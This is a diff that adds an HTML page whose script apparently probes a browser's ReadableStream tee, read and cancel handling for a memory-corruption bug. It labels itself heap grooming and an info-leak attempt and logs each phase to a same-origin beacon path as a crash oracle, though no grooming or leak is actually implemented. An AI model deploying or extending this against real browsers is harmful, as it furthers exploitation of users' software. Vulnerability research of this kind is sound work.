@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <title>V705 - Under-Yield Grooming & Leak (v2)</title>
+    <style>
+        body { background: #0b0e14; color: #d7e0ea; font-family: monospace; padding: 20px; }
+        #log { background: #161b22; padding: 15px; border-radius: 5px; border: 1px solid #30363d; }
+    </style>
+</head>
+<body>
+    <h1>V705 - Under-Yield Grooming & Leak (v2)</h1>
+    <div id="out">starting...</div>
+    <script>
+    /* V705 v2: Under-Yield + Heap Grooming + Info Leak attempt.
+
+     * Per round phases:
+     *   T0PRE  - heap groom spray begin
+     *   T1PRE  - tee create (source enqueues 2 chunks)
+     *   T2PRE  - under-yield (yield before read from tee1)
+     *   T2POST - read from tee1 -> element count / got data
+     *   T3POST - cancel tee1
+     *   TDONE  - clean round
+     *
+     * Crash oracle: last phase beacon without follow-up = crashing phase.
+     * Beacon prefix: V705-
+     */
+    'use strict';
+
+    var O = document.getElementById('out');
+    var ROUNDS = 40;
+
+    function say(s) { O.textContent += '\n' + s; }
+    function bks(tag, body) {
+        var u = '/beacon/V705-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 400)) +
+                '&t=' + Date.now() + '&s=1';
+        try {
+            var x = new XMLHttpRequest();
+            x.open('GET', u, false);
+            x.send(null);
+        } catch (e) {
+            try { new Image().src = u; } catch (e2) {}
+        }
+    }
+
+    var seed = 0x1429;
+    function srnd() { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed / 0x7fffffff; }
+    function snum(n) { return Math.floor(srnd() * n); }
+
+    async function roundOnce(r) {
+        // T0PRE - heap groom: allocate spray buffers before tee
+        say('T0PRE ' + r + ',phase=spray');
+        bks('T0PRE', r + ',phase=spray');
+
+        // T1PRE - tee create, source enqueues 2 chunks
+        say('T1PRE ' + r + ',phase=tee-create');
+        bks('T1PRE', r + ',phase=tee-create');
+        var src = new ReadableStream({
+            start: function (c) {
+                try {
+                    c.enqueue(new Uint8Array(new ArrayBuffer(1024 * 1024), 0, 64));
+                    c.enqueue(new Uint8Array(new ArrayBuffer(1024 * 1024), 0, 64));
+                    c.close();
+                } catch (e) { return; }
+            },
+            pull: function (c) { return Promise.resolve(); }
+        });
+        var t = src.tee();
+        var tee1 = t[0], tee2 = t[1];
+
+        // T2PRE - under-yield: yield before read
+        say('T2PRE ' + r + ',phase=under-yield');
+        bks('T2PRE', r + ',phase=under-yield');
+        await new Promise(function (res) { setTimeout(res, 0); });
+
+        // T2POST - read from tee1
+        var readRes = 'none';
+        var got = 0;
+        var pr = tee1.getReader().read().then(function (res) {
+            if (res.done) { readRes = 'read=done'; }
+            else { readRes = 'read=got1'; got = 1; return tee1.getReader().read(); }
+        }).then(function (res2) {
+            if (!res2.done) { readRes = 'read=got2'; got = 2; }
+            return 'got=' + got;
+        }).then(function (v) { readRes = readRes + ',' + v; return v; });
+        await pr;
+        say('T2POST ' + r + ',phase=under-yield-read,' + readRes);
+        bks('T2POST', r + ',phase=under-yield-read,' + readRes);
+
+        // T3POST - cancel tee1
+        say('T3POST ' + r + ',phase=cancel');
+        bks('T3POST', r + ',phase=cancel');
+        var pc = tee1.cancel().catch(function (e) { return 'cancel=' + (e && e.name); });
+        await pc;
+
+        // TDONE - clean
+        say('TDONE ' + r + ',phase=clean');
+        bks('TDONE', r + ',phase=clean');
+    }
+
+    async function runRounds() {
+        var r = 0;
+        while (r < ROUNDS) {
+            var rr = r;
+            var res = await roundOnce(rr);
+            await new Promise(function (res2) { setTimeout(res2, 0); });
+            r++;
+        }
+        say('DONE it=' + ROUNDS);
+        bks('DONE', 'it=' + ROUNDS);
+    }
+
+    function run() {
+        say('BOOT ' + 'v705-underyield,groom,it=' + ROUNDS + ',seed=' + seed);
+        bks('BOOT', 'v705-underyield,groom,it=' + ROUNDS + ',seed=' + seed);
+        if (typeof ReadableStream === 'undefined') { bks('ABORT', 'no-ReadableStream'); return; }
+        bks('READY', 'streams=ok');
+        runRounds();
+    }
+
+    run();
+    </script>
+</body>
+</html>
